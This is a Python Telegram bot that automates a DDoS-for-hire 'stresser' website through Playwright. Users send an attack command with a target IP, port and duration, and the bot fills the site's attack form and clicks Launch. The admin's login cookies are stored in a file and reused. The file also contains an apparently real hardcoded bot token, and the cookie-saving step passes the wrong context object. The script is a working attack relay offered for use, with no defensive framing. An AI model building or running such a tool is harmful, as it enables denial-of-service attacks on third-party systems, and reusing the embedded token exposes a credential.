import os
import json
import asyncio
import threading
import time
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8521144614:AAE7Ec2Vvc8Y2sNsa52bgcFZ7ZmLjNQzEoM"
ADMIN_IDS = [7820814565]  # Sirf yeh ID admin hai
COOKIE_FILE = "session_cookies.json"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"

# ==================== GLOBAL VARIABLES ====================
playwright = None
browser = None
context = None
page = None
cookies_loaded = False
bot_ready = False

# ==================== COOKIE FUNCTIONS ====================
async def save_cookies(ctx):
    """Save cookies to file"""
    cookies = await ctx.cookies()
    with open(COOKIE_FILE, 'w') as f:
        json.dump(cookies, f, indent=2)
    print("✅ Cookies saved!")

async def load_cookies(ctx):
    """Load cookies from file"""
    global cookies_loaded
    try:
        if os.path.exists(COOKIE_FILE):
            with open(COOKIE_FILE, 'r') as f:
                cookies = json.load(f)
                await ctx.add_cookies(cookies)
                print("✅ Cookies loaded from file!")
                cookies_loaded = True
                return True
        else:
            print("📁 No cookie file found")
            cookies_loaded = False
            return False
    except Exception as e:
        print(f"❌ Error loading cookies: {e}")
        cookies_loaded = False
        return False

# ==================== BROWSER SETUP ====================
async def init_browser(headless=True):
    """Initialize browser with cookies"""
    global playwright, browser, context, page, cookies_loaded
    
    try:
        # Close existing browser if any
        await close_browser()
        
        # Start playwright
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(headless=headless)
        context = await browser.new_context()
        
        # Load cookies if available
        await load_cookies(context)
        
        # Create new page
        page = await context.new_page()
        
        return True
    except Exception as e:
        print(f"❌ Browser init error: {e}")
        return False

async def close_browser():
    """Close browser properly"""
    global playwright, browser, context, page
    
    try:
        if browser:
            await browser.close()
        if playwright:
            await playwright.stop()
    except:
        pass
    
    playwright = None
    browser = None
    context = None
    page = None

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - show status"""
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    
    if cookies_loaded:
        status = "✅ Bot is ready! Use /attack command."
    else:
        status = "⏳ Bot not ready. Admin needs to /login first."
    
    await update.message.reply_text(
        f"🤖 **Attack Bot**\n\n"
        f"Status: {status}\n\n"
        f"Commands:\n"
        f"• `/attack <ip> <port> <time>` - Launch attack\n"
        f"  Example: `/attack 1.1.1.1 80 60`\n"
        + ("• `/login` - Admin login (admin only)\n" if is_admin else "")
    )

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin login command"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ This command is for admin only.")
        return
    
    await update.message.reply_text(
        "🔐 **Login Process Started**\n\n"
        "1. A browser window will open\n"
        "2. Login manually to the website\n"
        "3. After login, type /done here\n\n"
        "Waiting for browser..."
    )
    
    # Initialize browser in visible mode
    success = await init_browser(headless=False)
    if success:
        await page.goto(LOGIN_URL)
    else:
        await update.message.reply_text("❌ Failed to start browser.")

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin done with login"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return
    
    global cookies_loaded
    
    try:
        # Save cookies
        await save_cookies(context)
        cookies_loaded = True
        
        # Switch to headless mode
        await close_browser()
        await init_browser(headless=True)
        
        await update.message.reply_text(
            "✅ **Login Successful!**\n\n"
            "Bot is now ready for attacks.\n"
            "Users can use /attack command."
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack command for users"""
    global page, cookies_loaded
    
    # Check if bot is ready
    if not cookies_loaded or page is None:
        await update.message.reply_text("⏳ Bot is not ready yet. Admin needs to login first.")
        return
    
    # Parse arguments
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "❌ **Invalid Format**\n\n"
            "Use: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`"
        )
        return
    
    ip, port_str, time_str = args
    
    # Validate port
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535")
            return
    except:
        await update.message.reply_text("❌ Invalid port number")
        return
    
    # Validate time
    try:
        duration = int(time_str)
        if duration < 10 or duration > 300:
            await update.message.reply_text("❌ Time must be between 10-300 seconds")
            return
    except:
        await update.message.reply_text("❌ Invalid time")
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"🔄 **Launching Attack...**\n\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: {duration}s"
    )
    
    # Run attack in separate thread with new event loop
    def run_attack():
        # Create new event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def perform_attack():
            nonlocal msg
            try:
                # Go to attack page
                await page.goto(WEBSITE_URL, wait_until='networkidle')
                await page.wait_for_timeout(2000)
                
                # Find input fields
                inputs = await page.query_selector_all('input[type="text"]')
                visible_inputs = []
                
                for inp in inputs:
                    if await inp.is_visible():
                        visible_inputs.append(inp)
                
                if len(visible_inputs) >= 3:
                    # Fill IP
                    await visible_inputs[0].fill('')
                    await visible_inputs[0].fill(ip)
                    
                    # Fill Port
                    await visible_inputs[1].fill('')
                    await visible_inputs[1].fill(str(port))
                    
                    # Fill Time
                    await visible_inputs[2].fill('')
                    await visible_inputs[2].fill(str(duration))
                    
                    # Find and click launch button
                    launch_btn = await page.query_selector('button:has-text("Launch")')
                    if launch_btn:
                        await launch_btn.click()
                        await page.wait_for_timeout(2000)
                        
                        await msg.edit_text(
                            f"✅ **Attack Launched Successfully!**\n\n"
                            f"Target: `{ip}:{port}`\n"
                            f"Duration: {duration}s"
                        )
                    else:
                        await msg.edit_text("❌ Launch button not found on page")
                else:
                    await msg.edit_text(f"❌ Only {len(visible_inputs)} input fields found (need 3)")
                    
            except Exception as e:
                await msg.edit_text(f"❌ Attack failed: {str(e)}")
        
        try:
            loop.run_until_complete(perform_attack())
        finally:
            loop.close()
    
    # Start thread
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check bot status"""
    if cookies_loaded and page is not None:
        await update.message.reply_text("✅ Bot is ready. Cookies loaded.")
    else:
        await update.message.reply_text("⏳ Bot not ready. Admin needs to login first.")

# ==================== MAIN FUNCTION ====================
async def main():
    """Main function"""
    global bot_ready
    
    print("="*60)
    print("🤖 PROFESSIONAL ATTACK BOT")
    print("="*60)
    print("Initializing...")
    
    # Try to load cookies on startup
    try:
        test_playwright = await async_playwright().start()
        test_browser = await test_playwright.chromium.launch(headless=True)
        test_context = await test_browser.new_context()
        
        if await load_cookies(test_context):
            global cookies_loaded, page, context, browser, playwright
            cookies_loaded = True
            context = test_context
            browser = test_browser
            playwright = test_playwright
            page = await context.new_page()
            print("✅ Cookies loaded automatically!")
        else:
            await test_browser.close()
            await test_playwright.stop()
            print("📁 No cookies found. Admin must login with /login")
    except Exception as e:
        print(f"⚠️ Startup note: {e}")
    
    print("="*60)
    print("Bot is running!")
    print("Admin: /login (first time) then /done")
    print("Users: /attack ip port time")
    print("="*60)

# ==================== APPLICATION SETUP ====================
def run_bot():
    """Run the bot application"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("done", done))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    # Run startup in background
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())
    
    # Start bot
    print("🤖 Bot is now polling for updates...")
    app.run_polling()

if __name__ == "__main__":
    run_bot()
